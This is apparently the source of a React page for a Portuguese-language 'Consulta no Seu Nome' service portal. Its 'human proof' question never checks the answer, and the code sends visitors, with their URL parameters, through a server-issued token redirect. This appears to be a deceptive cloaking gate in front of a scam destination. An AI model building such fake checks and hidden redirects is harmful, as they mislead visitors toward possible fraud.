import { useState } from "react";

export default function Quiz() {
  const [answer, setAnswer] = useState("");
  const [loading, setLoading] = useState(false);
  const [modalOpen, setModalOpen] = useState(false);
  const [step, setStep] = useState(1);

  const handleSubmit = async () => {
    setLoading(true);

    const wait = (ms) => new Promise((r) => setTimeout(r, ms));

    const goDefault = async () => {
      await wait(300);
      window.location.href = "/inicio";
    };

    try {
      const res = await fetch(`/api/session-token${window.location.search}`, { method: "POST" });

      const data = await res.json().catch(() => null);

      if (res.ok && data?.token) {
        window.location.href = `/api/go?token=${encodeURIComponent(data.token)}`;
      } else {
        await goDefault();
      }
    } catch {
      await goDefault();
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="page">
      <main className="center">
        <title>Consulta no Seu Nome</title>
        <h1 className="title">Portal de Atendimento</h1>
        <p className="subtitle">Acesse com segurança e agilidade</p>

        <button
          className="cta"
          onClick={() => setModalOpen(true)}
          aria-haspopup="dialog"
          aria-controls="modal-root"
        >
          Consultar agora
        </button>
      </main>

      <footer className="footer">
        <nav className="links">
          <a href="/politica-de-privacidade">Política de Privacidade</a>
          <span className="dot">•</span>
          <a href="/termos-de-uso">Termos de Uso</a>
          <span className="dot">•</span>
          <a href="/servicos">Serviços</a>
        </nav>
        <p className="copy">Todos direitos reservados 2025</p>
      </footer>

      {modalOpen && (
        <div
          id="modal-root"
          className="backdrop"
          role="dialog"
          aria-modal="true"
          aria-labelledby="modal-title"
        >
          <div className="modal popIn">
            {step === 1 && (
              <>
                <h2 id="modal-title" className="modalTitle">
                  Bem-vindo ao portal de atendimento
                </h2>
                <p className="modalText">
                  Para continuar, faremos uma verificação simples.
                </p>
                <button className="primary microTilt" onClick={() => setStep(2)}>
                  Iniciar verificação
                </button>
                <button
                  className="ghost"
                  onClick={() => {
                    setModalOpen(false);
                    setStep(1);
                    setAnswer("");
                  }}
                >
                  Cancelar
                </button>
              </>
            )}

            {step === 2 && (
              <>
                <h3 className="sectionOver">Prova humana para prosseguir</h3>
                <h2 className="question">Quanto é 1 + 2?</h2>

                <input
                  type="text"
                  value={answer}
                  onChange={(e) => setAnswer(e.target.value)}
                  placeholder="Digite sua resposta"
                  className="input"
                />

                <div className="row">
                  <button
                    className="primary microTilt"
                    onClick={handleSubmit}
                    disabled={loading}
                  >
                    {loading ? "Verificando..." : "Prosseguir"}
                  </button>
                  <button
                    className="ghost"
                    onClick={() => {
                      setStep(1);
                      setAnswer("");
                    }}
                  >
                    Voltar
                  </button>
                </div>
              </>
            )}
          </div>
        </div>
      )}

      <style jsx global>{`
        html, body, #__next { height: 100%; }
        * { box-sizing: border-box; }
        body {
          margin: 0;
          background: #f6f8fa;
          color: #222244;
          font-family: "Inter", system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
        }
        button, input { outline: none; font-family: inherit; }
      `}</style>

      <style jsx>{`
        .page {
          min-height: 100dvh;
          display: flex;
          flex-direction: column;
          justify-content: space-between;
          background: linear-gradient(180deg, #ffffff 0%, #f7f8fc 100%);
          color: #1f2a44;
        }

        .center {
          display: grid;
          place-items: center;
          text-align: center;
          padding: 64px 20px;
        }

        .title {
          margin: 12vh 0 8px;
          font-size: clamp(28px, 5vw, 44px);
          font-weight: 800;
          color: #2b257c;
          letter-spacing: -0.5px;
        }
        .subtitle {
          margin: 0 0 28px;
          opacity: 0.8;
          font-size: clamp(14px, 2.2vw, 18px);
          color: #4d4d73;
        }

        .cta {
          appearance: none;
          border: none;
          cursor: pointer;
          padding: 14px 32px;
          border-radius: 10px;
          background: linear-gradient(90deg, #635bff, #7c3aed);
          color: #ffffff;
          font-weight: 600;
          font-size: 16px;
          transition: transform 0.15s ease, box-shadow 0.25s ease;
          box-shadow: 0 6px 20px rgba(99, 91, 255, 0.35);
        }
        .cta:hover { transform: translateY(-2px); box-shadow: 0 8px 22px rgba(99, 91, 255, 0.45); }

        .footer {
          text-align: center;
          padding: 24px 16px 28px;
          line-height: 1.5;
          background: #f2f3f9;
          border-top: 1px solid rgba(0, 0, 0, 0.05);
        }
        .links a {
          color: #635bff;
          text-decoration: none;
          font-weight: 600;
        }
        .links a:hover { text-decoration: underline; }
        .dot { margin: 0 10px; opacity: 0.65; }
        .copy { margin: 6px 0 0; opacity: 0.7; color: #4a4a6a; }

        .backdrop {
          position: fixed;
          inset: 0;
          display: grid;
          place-items: center;
          background: rgba(0, 0, 0, 0.45);
          backdrop-filter: blur(3px);
          z-index: 50;
        }
        .modal {
          width: min(92vw, 480px);
          background: #ffffff;
          border-radius: 16px;
          padding: 28px;
          box-shadow: 0 24px 60px rgba(0, 0, 0, 0.25);
        }

        .modalTitle {
          margin: 4px 0 8px;
          font-size: clamp(20px, 4vw, 26px);
          font-weight: 800;
          color: #2b257c;
        }
        .modalText { margin: 0 0 18px; opacity: 0.9; color: #44446b; }
        .sectionOver {
          margin: 2px 0 6px;
          font-size: 13px;
          text-transform: uppercase;
          opacity: 0.7;
          color: #5a5a8a;
        }
        .question {
          margin: 0 0 12px;
          font-size: 22px;
          font-weight: 700;
          color: #2b257c;
        }

        .input {
          width: 100%;
          padding: 12px 14px;
          border-radius: 8px;
          border: 1px solid #d4d6e8;
          margin: 4px 0 16px;
          text-align: center;
          font-size: 16px;
          background: #fafbff;
          color: #2a2a4f;
          transition: border-color 160ms ease, box-shadow 160ms ease;
        }
        .input:focus {
          border-color: #7c3aed;
          box-shadow: 0 0 0 2px rgba(124, 58, 237, 0.25);
        }

        .row { display: flex; gap: 10px; flex-wrap: wrap; }

        .primary {
          flex: 1;
          min-width: 160px;
          border: none;
          cursor: pointer;
          padding: 12px 18px;
          border-radius: 8px;
          background: linear-gradient(90deg, #635bff, #7c3aed);
          color: #fff;
          font-weight: 700;
          transition: transform 0.15s ease, box-shadow 0.25s ease;
          box-shadow: 0 4px 14px rgba(99, 91, 255, 0.35);
        }
        .primary:hover:not(:disabled) { transform: translateY(-1px); box-shadow: 0 6px 18px rgba(99, 91, 255, 0.45); }
        .primary:disabled { opacity: 0.7; cursor: not-allowed; }

        .ghost {
          flex: 0 1 auto;
          min-width: 120px;
          border: 1px solid #cfd2e8;
          background: transparent;
          color: #2a2a4f;
          cursor: pointer;
          padding: 12px 18px;
          border-radius: 8px;
          transition: background 0.2s ease, transform 0.12s ease;
        }
        .ghost:hover { background: #f1f3ff; transform: translateY(-1px); }

        .microTilt { transform-style: preserve-3d; }

        @media (max-width: 420px) {
          .modal { padding: 20px; }
        }
      `}</style>
    </div>
  );
}
